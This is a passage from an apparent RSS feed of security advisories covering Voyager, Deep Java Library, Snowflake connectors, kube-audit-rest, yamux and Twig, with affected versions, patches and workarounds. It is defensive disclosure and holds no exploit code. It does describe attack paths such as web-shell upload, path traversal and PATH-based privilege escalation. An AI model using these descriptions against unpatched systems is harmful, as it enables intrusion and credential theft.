                            <b>References:</b> <ul><li>- <a target='_blank' href='https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities/'>https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities/</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L213'>https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L213</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L44'>https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L44</a></li></ul><br>
                            <b>Details:</b> <b></b><br>DevDojo Voyager through 1.8.0 is vulnerable to path traversal at the &#x2F;admin&#x2F;compass.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-55416: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-55416</link>
                    <pubDate>2025-01-30T15:15:17Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-55416'>https://osv.dev/vulnerability/CVE-2024-55416</a><br>
                            <b>Published:</b> 2025-01-30T15:15:17Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities/'>https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities/</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/resources/views/master.blade.php#L132'>https://github.com/thedevdojo/voyager/blob/1.6/resources/views/master.blade.php#L132</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L44'>https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L44</a></li></ul><br>
                            <b>Details:</b> <b></b><br>DevDojo Voyager through version 1.8.0 is vulnerable to reflected XSS via &#x2F;admin&#x2F;compass. By manipulating an authenticated user to click on a link, arbitrary Javascript can be executed.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-55417: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-55417</link>
                    <pubDate>2025-01-30T15:15:17Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-55417'>https://osv.dev/vulnerability/CVE-2024-55417</a><br>
                            <b>Published:</b> 2025-01-30T15:15:17Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities/'>https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities/</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerMediaController.php#L238'>https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerMediaController.php#L238</a></li></ul><br>
                            <b>Details:</b> <b></b><br>DevDojo Voyager through version 1.8.0 is vulnerable to bypassing the file type verification when an authenticated user uploads a file via &#x2F;admin&#x2F;media&#x2F;upload. An authenticated user can upload a web shell causing arbitrary code execution on the server.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-jcrp-x7w3-ffmg: 9.8 | <b>Deep Java Library path traversal issue</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-jcrp-x7w3-ffmg</link>
                    <pubDate>2025-01-29T22:21:33Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-jcrp-x7w3-ffmg'>https://osv.dev/vulnerability/GHSA-jcrp-x7w3-ffmg</a><br>
                            <b>Published:</b> 2025-01-29T22:21:33Z<br>
                            <b>Severity:</b> 9.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/deepjavalibrary/djl/security/advisories/GHSA-jcrp-x7w3-ffmg'>https://github.com/deepjavalibrary/djl/security/advisories/GHSA-jcrp-x7w3-ffmg</a></li><li>- <a target='_blank' href='https://github.com/deepjavalibrary/djl/commit/7415cc5f72aae69ea9716a5e4f709af03a77a619'>https://github.com/deepjavalibrary/djl/commit/7415cc5f72aae69ea9716a5e4f709af03a77a619</a></li><li>- <a target='_blank' href='https://aws.amazon.com/security/security-bulletins/AWS-2025-003'>https://aws.amazon.com/security/security-bulletins/AWS-2025-003</a></li><li>- <a target='_blank' href='https://github.com/deepjavalibrary/djl'>https://github.com/deepjavalibrary/djl</a></li></ul><br>
                            <b>Details:</b> <b>Deep Java Library path traversal issue</b><br>## Summary

[Deep Java Library (DJL)](https:&#x2F;&#x2F;docs.djl.ai&#x2F;master&#x2F;index.html) is an open-source, high-level, engine-agnostic Java framework for deep learning. DJL is designed to be easy to get started with and simple to use for Java developers. DJL provides a native Java development experience and functions like any other regular Java library.

DJL provides utilities for extracting tar and zip model archives that are used when loading models for use with DJL. These utilities were found to contain issues that do not protect against absolute path traversal during the extraction process.

## Impact

An issue exists with DJL&#x27;s untar and unzip functionalities. Specifically, it is possible to create an archive on a Windows system, and when extracted on a MacOS or Linux system, write artifacts outside the intended destination during the extraction process. The reverse is also true for archives created on MacOS&#x2F;Linux systems and extracted on Windows systems.

Impacted versions: 0.1.0 - 0.31.0

## Patches

This issue has been patched in DJL 0.31.1 [1]

## Workarounds

Do not use model archive files from sources you do not trust. You should only use model archives from official sources like the DJL Model Zoo, or models that you have created and packaged yourself.

## References

If you have any questions or comments about this advisory, we ask that you contact AWS&#x2F;Amazon Security via our vulnerability reporting page [2] or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.

[1] https:&#x2F;&#x2F;github.com&#x2F;deepjavalibrary&#x2F;djl&#x2F;tree&#x2F;v0.31.1
[2] https:&#x2F;&#x2F;aws.amazon.com&#x2F;security&#x2F;vulnerability-reporting

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2mqw-rq5m-8hc8: 5.0 | <b>Snowflake.Data has weak temporary files permissions</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2mqw-rq5m-8hc8</link>
                    <pubDate>2025-01-29T20:50:55Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2mqw-rq5m-8hc8'>https://osv.dev/vulnerability/GHSA-2mqw-rq5m-8hc8</a><br>
                            <b>Published:</b> 2025-01-29T20:50:55Z<br>
                            <b>Severity:</b> 5.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-net/security/advisories/GHSA-2mqw-rq5m-8hc8'>https://github.com/snowflakedb/snowflake-connector-net/security/advisories/GHSA-2mqw-rq5m-8hc8</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-net/commit/89d91e8316ca213c5d184bcf469ed93977a5edf9'>https://github.com/snowflakedb/snowflake-connector-net/commit/89d91e8316ca213c5d184bcf469ed93977a5edf9</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-net'>https://github.com/snowflakedb/snowflake-connector-net</a></li></ul><br>
                            <b>Details:</b> <b>Snowflake.Data has weak temporary files permissions</b><br>### Issue
Snowflake discovered and remediated a vulnerability in the Snowflake Connector for .NET in which files downloaded from stages are temporarily placed in a world-readable local directory, making them accessible to unauthorized users on the same machine.

This vulnerability affects versions 2.0.12 through 4.2.0 on Linux and macOS. Snowflake fixed the issue in version 4.3.0.

### Vulnerability Details
When downloading files from stages, the Snowflake Connector for .NET uses the OS temporary directory to save files before copying them to the destination directory. The files in the temporary directory, which are removed once the write to the destination directory concludes, have world-readable permissions on Linux and macOS. This could allow any user on the local machine to access them during their limited lifetime.

### Solution
Snowflake released version 4.3.0 of the Snowflake Connector for .NET, which fixes this issue. We recommend users upgrade to version 4.3.0.

### Additional Information
If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https:&#x2F;&#x2F;hackerone.com&#x2F;snowflake?type=team).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2vpq-fh52-j3wv: 7.0 | <b>snowflake-connector-python vulnerable to SQL Injection in write_pandas</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2vpq-fh52-j3wv</link>
                    <pubDate>2025-01-29T20:50:33Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2vpq-fh52-j3wv'>https://osv.dev/vulnerability/GHSA-2vpq-fh52-j3wv</a><br>
                            <b>Published:</b> 2025-01-29T20:50:33Z<br>
                            <b>Severity:</b> 7.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-2vpq-fh52-j3wv'>https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-2vpq-fh52-j3wv</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python/commit/f3f9b666518d29c31a49384bbaa9a65889e72056'>https://github.com/snowflakedb/snowflake-connector-python/commit/f3f9b666518d29c31a49384bbaa9a65889e72056</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python'>https://github.com/snowflakedb/snowflake-connector-python</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1'>https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1</a></li></ul><br>
                            <b>Details:</b> <b>snowflake-connector-python vulnerable to SQL Injection in write_pandas</b><br>### Issue
Snowflake discovered and remediated a vulnerability in the Snowflake Connector for Python. A function from the snowflake.connector.pandas_tools module is vulnerable to SQL injection.

This vulnerability affects versions 2.2.5 through 3.13.0. Snowflake fixed the issue in version 3.13.1.

### Vulnerability Details
A function from the snowflake.connector.pandas_tools module is not sanitizing all of its arguments, and queries using them are not parametrized. An attacker controlling these arguments could achieve SQL injection by passing crafted input. Any SQL executed that way by an attacker would still run in the context of the current session.

### Solution
Snowflake released version 3.13.1 of the Snowflake Connector for Python, which fixes this issue. We recommend users upgrade to version 3.13.1.

### Additional Information
If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https:&#x2F;&#x2F;hackerone.com&#x2F;snowflake?type=team).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-m4f6-vcj4-w5mx: 6.7 | <b>snowflake-connector-python vulnerable to insecure deserialization of the OCSP response cache</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-m4f6-vcj4-w5mx</link>
                    <pubDate>2025-01-29T20:50:18Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-m4f6-vcj4-w5mx'>https://osv.dev/vulnerability/GHSA-m4f6-vcj4-w5mx</a><br>
                            <b>Published:</b> 2025-01-29T20:50:18Z<br>
                            <b>Severity:</b> 6.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-m4f6-vcj4-w5mx'>https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-m4f6-vcj4-w5mx</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python/commit/3769b43822357c3874c40f5e74068458c2dc79af'>https://github.com/snowflakedb/snowflake-connector-python/commit/3769b43822357c3874c40f5e74068458c2dc79af</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python'>https://github.com/snowflakedb/snowflake-connector-python</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1'>https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1</a></li></ul><br>
                            <b>Details:</b> <b>snowflake-connector-python vulnerable to insecure deserialization of the OCSP response cache</b><br>### Issue
Snowflake discovered and remediated a vulnerability in the Snowflake Connector for Python. The OCSP response cache uses pickle as the serialization format, potentially leading to local privilege escalation.

This vulnerability affects versions 2.7.12 through 3.13.0. Snowflake fixed the issue in version 3.13.1.

### Vulnerability Details
The OCSP response cache is saved locally on the machine running the Connector using the pickle serialization format. This can potentially lead to local privilege escalation if an attacker has write access to the OCSP response cache file.

### Solution
Snowflake released version 3.13.1 of the Snowflake Connector for Python, which fixes this issue. We recommend users upgrade to version 3.13.1.

### Additional Information
If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https:&#x2F;&#x2F;hackerone.com&#x2F;snowflake?type=team).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-r2x6-cjg7-8r43: 4.4 | <b>snowflake-connector-python vulnerable to insecure cache files permissions</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-r2x6-cjg7-8r43</link>
                    <pubDate>2025-01-29T20:49:59Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-r2x6-cjg7-8r43'>https://osv.dev/vulnerability/GHSA-r2x6-cjg7-8r43</a><br>
                            <b>Published:</b> 2025-01-29T20:49:59Z<br>
                            <b>Severity:</b> 4.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-r2x6-cjg7-8r43'>https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-r2x6-cjg7-8r43</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python/commit/3769b43822357c3874c40f5e74068458c2dc79af'>https://github.com/snowflakedb/snowflake-connector-python/commit/3769b43822357c3874c40f5e74068458c2dc79af</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python'>https://github.com/snowflakedb/snowflake-connector-python</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1'>https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1</a></li></ul><br>
                            <b>Details:</b> <b>snowflake-connector-python vulnerable to insecure cache files permissions</b><br>### Issue
Snowflake discovered and remediated a vulnerability in the Snowflake Connector for Python. On Linux systems, when temporary credential caching is enabled, the Snowflake Connector for Python will cache temporary credentials locally in a world-readable file.

This vulnerability affects versions 2.3.7 through 3.13.0. Snowflake fixed the issue in version 3.13.1.

### Vulnerability Details
On Linux, when either EXTERNALBROWSER or USERNAME_PASSWORD_MFA authentication methods are used with temporary credential caching enabled, the Snowflake Connector for Python will cache the temporary credentials in a local file. In the vulnerable versions of the Driver, this file is created with world-readable permissions.

### Solution
Snowflake released version 3.13.1 of the Snowflake Connector for Python, which fixes this issue. We recommend users upgrade to version 3.13.1.

### Additional Information
If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https:&#x2F;&#x2F;hackerone.com&#x2F;snowflake?type=team).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-hcr5-wv4p-h2g2: 5.1 | <b>kube-audit-rest&#x27;s example logging configuration could disclose secret values in the audit log</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-hcr5-wv4p-h2g2</link>
                    <pubDate>2025-01-29T20:47:51Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-hcr5-wv4p-h2g2'>https://osv.dev/vulnerability/GHSA-hcr5-wv4p-h2g2</a><br>
                            <b>Published:</b> 2025-01-29T20:47:51Z<br>
                            <b>Severity:</b> 5.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/RichardoC/kube-audit-rest/security/advisories/GHSA-hcr5-wv4p-h2g2'>https://github.com/RichardoC/kube-audit-rest/security/advisories/GHSA-hcr5-wv4p-h2g2</a></li><li>- <a target='_blank' href='https://github.com/RichardoC/kube-audit-rest/commit/db1aa5b867256b0a7bf206544c6981ab068b73dc'>https://github.com/RichardoC/kube-audit-rest/commit/db1aa5b867256b0a7bf206544c6981ab068b73dc</a></li><li>- <a target='_blank' href='https://github.com/RichardoC/kube-audit-rest'>https://github.com/RichardoC/kube-audit-rest</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3431'>https://pkg.go.dev/vuln/GO-2025-3431</a></li></ul><br>
                            <b>Details:</b> <b>kube-audit-rest&#x27;s example logging configuration could disclose secret values in the audit log</b><br>### Impact
_What kind of vulnerability is it? Who is impacted?_
If the &quot;full-elastic-stack&quot; example vector configuration was used for a real cluster, the previous values of kubernetes secrets would have been disclosed in the audit messages.

### Patches
_Has the problem been patched? What versions should users upgrade to?_
The example has been updated to fix this in commit 9df8886b4819409f566233adc7c3b7a43a4096ba


### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_
Replace 
```yaml

          if .request.requestKind.kind == &quot;Secret&quot; {
            del(.request.object.data)
            .request.object.data.redacted = &quot;REDACTED&quot;
            del(.request.oldObject.data)
            .request.oldObject.data.redacted = &quot;REDACTED&quot;
          }
```
In the vector &quot;audit-files-json-parser-and-redaction&quot; step
with
```yaml

          if .request.requestKind.kind == &quot;Secret&quot; {
            # Redact the secret data
            del(.request.object.data)
            .request.object.data.redacted = &quot;REDACTED&quot;
            del(.request.oldObject.data)
            .request.oldObject.data.redacted = &quot;REDACTED&quot;
            # Remove the previously set secret data - Not bothering to parse it as this annotation shouldn&#x27;t ever be needed
            del(.request.object.metadata.annotations.[&quot;kubectl.kubernetes.io&#x2F;last-applied-configuration&quot;])
            del(.request.oldObject.metadata.annotations.[&quot;kubectl.kubernetes.io&#x2F;last-applied-configuration&quot;])
          }
```


### References
_Are there any links users can visit to find out more?_
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-29qp-crvh-w22m: 6.6 | <b>Withdrawn Advisory: github.com&#x2F;hashicorp&#x2F;yamux&#x27;s DefaultConfig has dangerous defaults causing hung Read</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-29qp-crvh-w22m</link>
                    <pubDate>2025-01-29T19:19:11Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-29qp-crvh-w22m'>https://osv.dev/vulnerability/GHSA-29qp-crvh-w22m</a><br>
                            <b>Published:</b> 2025-01-29T19:19:11Z<br>
                            <b>Severity:</b> 6.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/golang/vulndb/issues/3408'>https://github.com/golang/vulndb/issues/3408</a></li><li>- <a target='_blank' href='https://github.com/golang/vulndb/issues/3453'>https://github.com/golang/vulndb/issues/3453</a></li><li>- <a target='_blank' href='https://github.com/hashicorp/yamux/issues/142'>https://github.com/hashicorp/yamux/issues/142</a></li><li>- <a target='_blank' href='https://github.com/hashicorp/yamux/pull/143'>https://github.com/hashicorp/yamux/pull/143</a></li><li>- <a target='_blank' href='https://github.com/hashicorp/yamux'>https://github.com/hashicorp/yamux</a></li></ul><br>
                            <b>Details:</b> <b>Withdrawn Advisory: github.com&#x2F;hashicorp&#x2F;yamux&#x27;s DefaultConfig has dangerous defaults causing hung Read</b><br>## Withdrawn Advisory
This advisory has been withdrawn because further research determined that `github.com&#x2F;hashicorp&#x2F;yamux` was not vulnerable to denial of service in the manner described. This link is maintained to preserve external references.

## Original Description
The default values for Session.config.KeepAliveInterval and Session.config.ConnectionWriteTimeout of 30s and 10s create the possibility for timed out writes that most aren&#x27;t handling in their readers.

Calls to Stream.Read on one side of a connection will hang until the underlying Session is closed if the corresponding Stream.Write call on the other side it&#x27;s waiting for returns with ErrConnectionWriteTimeout. This happens in the case of network congestion between the two sides.

If you keep Session.sendCh full (fixed capacity of 64) for ConnectionWriteTimeout, but for less than the KeepAliveInterval + ConnectionWriteTimeout (which would kill the Session), Stream.Write will return ErrConnectionWriteTimeout. The state of the underlying Session or Stream is not modified. When this happens, the other side&#x27;s Stream.Read call that&#x27;s waiting for that write will never return because there&#x27;s no timeout for this edge-case.

Since no keep alive timed out, you can continue to use the Session once the network congestion is resolved, but that Stream.Read call will only return when the Session closes or the response shows up. Since the write call on the other side timed out the call to Stream.Read will never return.

Any conditions that cause network writes to stall for 10-30 seconds can trigger this Denial of Service- extremely high CPU contention on either side of the connection, BGP reconvergence, etc. To resolve the Denial of Service issue, you have to re-establish the connections, which will usually require a hard restart of the service on either end of the connection.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-xfhv-wqj6-rx99: 4.4 | <b>snowflake-sdk may incorrectly validate temporary credential cache file permissions</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-xfhv-wqj6-rx99</link>
                    <pubDate>2025-01-29T18:42:26Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-xfhv-wqj6-rx99'>https://osv.dev/vulnerability/GHSA-xfhv-wqj6-rx99</a><br>
                            <b>Published:</b> 2025-01-29T18:42:26Z<br>
                            <b>Severity:</b> 4.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-nodejs/security/advisories/GHSA-xfhv-wqj6-rx99'>https://github.com/snowflakedb/snowflake-connector-nodejs/security/advisories/GHSA-xfhv-wqj6-rx99</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-nodejs/commit/89731b3a4d61a75b721d13d4e47a7a3712ffa45f'>https://github.com/snowflakedb/snowflake-connector-nodejs/commit/89731b3a4d61a75b721d13d4e47a7a3712ffa45f</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-connector-nodejs'>https://github.com/snowflakedb/snowflake-connector-nodejs</a></li></ul><br>
                            <b>Details:</b> <b>snowflake-sdk may incorrectly validate temporary credential cache file permissions</b><br>### Issue
Snowflake discovered and remediated a vulnerability in the Snowflake NodeJS Driver. File permissions checks of the temporary credential cache could be bypassed by an attacker with write access to the local cache directory.

This vulnerability affects versions 1.12.0 through 2.0.1 on Linux. Snowflake fixed the issue in version 2.0.2.

### Vulnerability Details
On Linux, when either EXTERNALBROWSER or USERNAME_PASSWORD_MFA authentication methods are used with temporary credential caching enabled, the Snowflake NodeJS Driver will cache temporary credentials in a local file. Due to a bug, the check verifying that the cache file can be accessed only by the user running the Driver always succeeded, but didn’t verify the permissions or the ownership correctly. An attacker with write access to the local cache folder could plant an empty file there and the Driver would use it to store temporary credentials instead of rejecting it due to overly broad permissions.

### Solution
Snowflake released version 2.0.2 of the Snowflake NodeJS Driver, which fixes this issue. We recommend users upgrade to version 2.0.2.

### Additional Information
If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https:&#x2F;&#x2F;hackerone.com&#x2F;snowflake?type=team).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-33g6-495w-v8j2: 4.4 | <b>Snowflake JDBC uses insecure temporary credential cache file permissions</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-33g6-495w-v8j2</link>
                    <pubDate>2025-01-29T18:42:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-33g6-495w-v8j2'>https://osv.dev/vulnerability/GHSA-33g6-495w-v8j2</a><br>
                            <b>Published:</b> 2025-01-29T18:42:07Z<br>
                            <b>Severity:</b> 4.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-jdbc/security/advisories/GHSA-33g6-495w-v8j2'>https://github.com/snowflakedb/snowflake-jdbc/security/advisories/GHSA-33g6-495w-v8j2</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-jdbc/commit/9e1a5acf12406b16c4780ca013f4c4db48b74b59'>https://github.com/snowflakedb/snowflake-jdbc/commit/9e1a5acf12406b16c4780ca013f4c4db48b74b59</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-jdbc'>https://github.com/snowflakedb/snowflake-jdbc</a></li></ul><br>
                            <b>Details:</b> <b>Snowflake JDBC uses insecure temporary credential cache file permissions</b><br>### Issue
Snowflake discovered and remediated a vulnerability in the Snowflake JDBC Driver. On Linux systems, when temporary credential caching is enabled, the Snowflake JDBC Driver will cache temporary credentials locally in a world-readable file.

This vulnerability affects versions 3.6.8 through 3.21.0. Snowflake fixed the issue in version 3.22.0.

### Vulnerability Details
On Linux, when either EXTERNALBROWSER or USERNAME_PASSWORD_MFA authentication methods are used with temporary credential caching enabled, the Snowflake JDBC Driver will cache temporary credentials in a local file. In the vulnerable versions of the Driver, this file is created with world-readable permissions.

### Solution
Snowflake released version 3.22.0 of the Snowflake JDBC Driver, which fixes this issue. We recommend users upgrade to version 3.22.0.

### Additional Information
If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https:&#x2F;&#x2F;hackerone.com&#x2F;snowflake?type=team).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7hpq-3g6w-pvhf: 7.8 | <b>Snowflake JDBC allows an untrusted search path on Windows</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7hpq-3g6w-pvhf</link>
                    <pubDate>2025-01-29T18:41:57Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7hpq-3g6w-pvhf'>https://osv.dev/vulnerability/GHSA-7hpq-3g6w-pvhf</a><br>
                            <b>Published:</b> 2025-01-29T18:41:57Z<br>
                            <b>Severity:</b> 7.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-jdbc/security/advisories/GHSA-7hpq-3g6w-pvhf'>https://github.com/snowflakedb/snowflake-jdbc/security/advisories/GHSA-7hpq-3g6w-pvhf</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-jdbc/commit/4f01bb8f9b708c71e7a2111c87371dbfc1d53dd6'>https://github.com/snowflakedb/snowflake-jdbc/commit/4f01bb8f9b708c71e7a2111c87371dbfc1d53dd6</a></li><li>- <a target='_blank' href='https://github.com/snowflakedb/snowflake-jdbc'>https://github.com/snowflakedb/snowflake-jdbc</a></li></ul><br>
                            <b>Details:</b> <b>Snowflake JDBC allows an untrusted search path on Windows</b><br>### Issue
Snowflake discovered and remediated a vulnerability in the Snowflake JDBC Driver. When the EXTERNALBROWSER authentication method is used on Windows, an attacker with write access to a directory in the %PATH% can escalate their privileges to the user that runs the vulnerable JDBC Driver version.

This vulnerability affects versions 3.2.3 through 3.21.0 on Windows. Snowflake fixed the issue in version 3.22.0.

### Vulnerability Details
When the EXTERNALBROWSER authentication method is selected, the Snowflake JDBC Driver on non-macOS operating systems tries to open the SSO URL using xdg-open. Because xdg-open is a Linux program that doesn’t exist in a default Windows installation, a sufficiently privileged attacker could place a malicious executable in one of the directories on the %PATH% and achieve local privilege escalation to the user running the JDBC Driver.

### Solution
Snowflake released version 3.22.0 of the Snowflake JDBC Driver, which fixes this issue. We recommend users upgrade to version 3.22.0.

### Additional Information
If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https:&#x2F;&#x2F;hackerone.com&#x2F;snowflake?type=team).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-3xg3-cgvq-2xwr: 4.3 | <b>Twig security issue where escaping was missing when using null coalesce operator</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-3xg3-cgvq-2xwr</link>
                    <pubDate>2025-01-29T18:41:43Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-3xg3-cgvq-2xwr'>https://osv.dev/vulnerability/GHSA-3xg3-cgvq-2xwr</a><br>
                            <b>Published:</b> 2025-01-29T18:41:43Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/twigphp/Twig/security/advisories/GHSA-3xg3-cgvq-2xwr'>https://github.com/twigphp/Twig/security/advisories/GHSA-3xg3-cgvq-2xwr</a></li><li>- <a target='_blank' href='https://github.com/twigphp/Twig/commit/38576b12f05df3cc871bf68f39ccb46b418334a3'>https://github.com/twigphp/Twig/commit/38576b12f05df3cc871bf68f39ccb46b418334a3</a></li><li>- <a target='_blank' href='https://github.com/FriendsOfPHP/security-advisories/blob/master/twig/twig/CVE-2025-24374.yaml'>https://github.com/FriendsOfPHP/security-advisories/blob/master/twig/twig/CVE-2025-24374.yaml</a></li><li>- <a target='_blank' href='https://github.com/twigphp/Twig'>https://github.com/twigphp/Twig</a></li><li>- <a target='_blank' href='https://symfony.com/blog/twig-cve-2025-24374-missing-output-escaping-for-the-null-coalesce-operator'>https://symfony.com/blog/twig-cve-2025-24374-missing-output-escaping-for-the-null-coalesce-operator</a></li></ul><br>
                            <b>Details:</b> <b>Twig security issue where escaping was missing when using null coalesce operator</b><br>When using the `??` operator, output escaping was missing for the expression on the left side of the operator.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-v664-qgx9-wf79: 7.2 | <b>RuoYi allowed unauthorized attackers to view the session ID of the admin in the system monitoring</b></title>
